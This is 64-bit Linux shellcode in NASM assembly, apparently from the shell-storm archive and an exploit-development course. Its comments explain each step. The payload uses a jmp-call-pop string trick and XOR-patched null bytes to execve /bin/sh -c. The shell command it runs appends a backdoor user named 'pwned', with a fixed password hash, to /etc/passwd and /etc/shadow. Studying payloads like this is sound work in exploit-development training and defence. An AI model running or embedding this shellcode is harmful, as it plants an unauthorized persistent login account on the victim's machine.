; http://shell-storm.org/shellcode/files/shellcode-879.php
; shellcode name add_user_password
; Author    : Christophe G SLAE64-1337
; Len       : 273 bytes
; Language  : Nasm
; "name = pwned ; pass = $pass$"
; add user and password with echo cmd
; tested kali linux , kernel 3.12


; analysis by comment, since metasploit does not work properly on host machine. 


global _start

_start:
        jmp short findaddress
                                                                 
_realstart:
        pop rdi
        xor byte [rdi + 7] , 0x41 ; replace A to null byte "/bin/shA"
        xor byte [rdi + 10]  ,0x41 ; same "-cA"
        xor rdx , rdx
        lea rdi , [rdi]
        lea r9 , [rdi + 8]
        lea r10 , [rdi + 11]
        push rdx
        push r10
        push r9
        push rdi
        mov rsi , rsp
        add al , 59
        syscall


findaddress:
        call _realstart
        string : db "/bin/shA-cAecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash >> /etc/passwd ; echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7::: >> /etc/shadow"

